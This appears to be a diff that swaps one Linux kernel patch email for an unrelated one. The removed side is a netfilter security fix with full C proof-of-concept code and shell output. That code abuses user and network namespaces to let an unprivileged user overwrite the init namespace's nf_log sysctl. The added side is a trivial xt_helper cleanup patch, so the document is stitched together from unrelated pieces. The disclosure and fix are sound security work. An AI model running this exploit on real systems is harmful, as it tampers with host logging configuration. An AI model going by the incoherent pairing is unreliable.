@@ -1,144 +1,41 @@
-From: Jann Horn <jann@thejh.net>
-Subject: [PATCH] netfilter: fix namespace handling in nf_log_proc_dostring
-Date: Sun, 18 Sep 2016 21:40:55 +0200
-Message-ID: <1474227655-5022-1-git-send-email-jann@thejh.net>
-Cc: netfilter-devel@vger.kernel.org, netdev@vger.kernel.org,
-        security@kernel.org
-To: Pablo Neira Ayuso <pablo@netfilter.org>,
-        Patrick McHardy <kaber@trash.net>,
-        Jozsef Kadlecsik <kadlec@blackhole.kfki.hu>,
-        "David S. Miller" <davem@davemloft.net>
-Return-path: <netdev-owner@vger.kernel.org>
-Sender: netdev-owner@vger.kernel.org
-List-Id: netfilter-devel.vger.kernel.org
+From: fgao@ikuai8.com
+Subject: [PATCH nf-next] netfilter: xt_helper: Use sizeof(variable) instead of literal number
+Date: Tue, 20 Sep 2016 10:31:04 +0800
+Message-ID: <1474338664-7258-1-git-send-email-fgao@ikuai8.com>
+Cc: gfree.wind@gmail.com, Gao Feng <fgao@ikuai8.com>
+To: pablo@netfilter.org, netfilter-devel@vger.kernel.org
+Return-path: <netfilter-devel-owner@vger.kernel.org>
+Received: from SMTPBG132.QQ.COM ([113.108.23.42]:56765 "EHLO smtpbg132.qq.com"
+        rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
+        id S1753530AbcITCcD (ORCPT <rfc822;netfilter-devel@vger.kernel.org>);
+        Mon, 19 Sep 2016 22:32:03 -0400
+Sender: netfilter-devel-owner@vger.kernel.org
+List-ID: <netfilter-devel.vger.kernel.org>
 
-nf_log_proc_dostring() used current's network namespace instead of the one
-corresponding to the sysctl file the write was performed on. Because the
-permission check happens at open time and the nf_log files in namespaces
-are accessible for the namespace owner, this can be abused by an
-unprivileged user to effectively write to the init namespace's nf_log
-sysctls.
+From: Gao Feng <fgao@ikuai8.com>
 
-Stash the "struct net *" in extra2 - data and extra1 are already used.
+It's better to use sizeof(info->name)-1 as index to force set the string
+tail instead of literal number '29'.
 
-Repro code:
-
-#define _GNU_SOURCE
-#include <stdlib.h>
-#include <sched.h>
-#include <err.h>
-#include <sys/mount.h>
-#include <sys/types.h>
-#include <sys/wait.h>
-#include <fcntl.h>
-#include <unistd.h>
-#include <string.h>
-#include <stdio.h>
-
-char child_stack[1000000];
-
-uid_t outer_uid;
-gid_t outer_gid;
-int stolen_fd = -1;
-
-void writefile(char *path, char *buf) {
-        int fd = open(path, O_WRONLY);
-        if (fd == -1)
-                err(1, "unable to open thing");
-        if (write(fd, buf, strlen(buf)) != strlen(buf))
-                err(1, "unable to write thing");
-        close(fd);
-}
-
-int child_fn(void *p_) {
-        if (mount("proc", "/proc", "proc", MS_NOSUID|MS_NODEV|MS_NOEXEC,
-                  NULL))
-                err(1, "mount");
-
-        /* Yes, we need to set the maps for the net sysctls to recognize us
-         * as namespace root.
-         */
-        char buf[1000];
-        sprintf(buf, "0 %d 1\n", (int)outer_uid);
-        writefile("/proc/1/uid_map", buf);
-        writefile("/proc/1/setgroups", "deny");
-        sprintf(buf, "0 %d 1\n", (int)outer_gid);
-        writefile("/proc/1/gid_map", buf);
-
-        stolen_fd = open("/proc/sys/net/netfilter/nf_log/2", O_WRONLY);
-        if (stolen_fd == -1)
-                err(1, "open nf_log");
-        return 0;
-}
-
-int main(void) {
-        outer_uid = getuid();
-        outer_gid = getgid();
-
-        int child = clone(child_fn, child_stack + sizeof(child_stack),
-                          CLONE_FILES|CLONE_NEWNET|CLONE_NEWNS|CLONE_NEWPID
-                          |CLONE_NEWUSER|CLONE_VM|SIGCHLD, NULL);
-        if (child == -1)
-                err(1, "clone");
-        int status;
-        if (wait(&status) != child)
-                err(1, "wait");
-        if (!WIFEXITED(status) || WEXITSTATUS(status) != 0)
-                errx(1, "child exit status bad");
-
-        char *data = "NONE";
-        if (write(stolen_fd, data, strlen(data)) != strlen(data))
-                err(1, "write");
-        return 0;
-}
-
-Repro:
-
-$ gcc -Wall -o attack attack.c -std=gnu99
-$ cat /proc/sys/net/netfilter/nf_log/2
-nf_log_ipv4
-$ ./attack
-$ cat /proc/sys/net/netfilter/nf_log/2
-NONE
-
-Because this looks like an issue with very low severity, I'm sending it to
-the public list directly.
-
-Signed-off-by: Jann Horn <jann@thejh.net>
+Signed-off-by: Gao Feng <fgao@ikuai8.com>
 ---
- net/netfilter/nf_log.c | 6 ++++--
- 1 file changed, 4 insertions(+), 2 deletions(-)
+ net/netfilter/xt_helper.c | 2 +-
+ 1 file changed, 1 insertion(+), 1 deletion(-)
 
-diff --git a/net/netfilter/nf_log.c b/net/netfilter/nf_log.c
-index aa5847a..1df2c8d 100644
---- a/net/netfilter/nf_log.c
-+++ b/net/netfilter/nf_log.c
-@@ -420,7 +420,7 @@ static int nf_log_proc_dostring(struct ctl_table *table, int write,
- 	char buf[NFLOGGER_NAME_LEN];
- 	int r = 0;
- 	int tindex = (unsigned long)table->extra1;
--	struct net *net = current->nsproxy->net_ns;
-+	struct net *net = table->extra2;
- 
- 	if (write) {
- 		struct ctl_table tmp = *table;
-@@ -474,7 +474,6 @@ static int netfilter_log_sysctl_init(struct net *net)
- 				 3, "%d", i);
- 			nf_log_sysctl_table[i].procname	=
- 				nf_log_sysctl_fnames[i];
--			nf_log_sysctl_table[i].data = NULL;
- 			nf_log_sysctl_table[i].maxlen = NFLOGGER_NAME_LEN;
- 			nf_log_sysctl_table[i].mode = 0644;
- 			nf_log_sysctl_table[i].proc_handler =
-@@ -484,6 +483,9 @@ static int netfilter_log_sysctl_init(struct net *net)
- 		}
+diff --git a/net/netfilter/xt_helper.c b/net/netfilter/xt_helper.c
+index 9f4ab00..f71ee88 100644
+--- a/net/netfilter/xt_helper.c
++++ b/net/netfilter/xt_helper.c
+@@ -65,7 +65,7 @@ static int helper_mt_check(const struct xt_mtchk_param *par)
+ 			par->family);
+ 		return ret;
  	}
+-	info->name[29] = '\0';
++	info->name[sizeof(info->name) - 1] = '\0';
+ 	return 0;
+ }
  
-+	for (i = NFPROTO_UNSPEC; i < NFPROTO_NUMPROTO; i++)
-+		table[i].extra2 = net;
-+
- 	net->nf.nf_log_dir_header = register_net_sysctl(net,
- 						"net/netfilter/nf_log",
- 						table);
 -- 
-2.1.4
+1.9.1
+
+
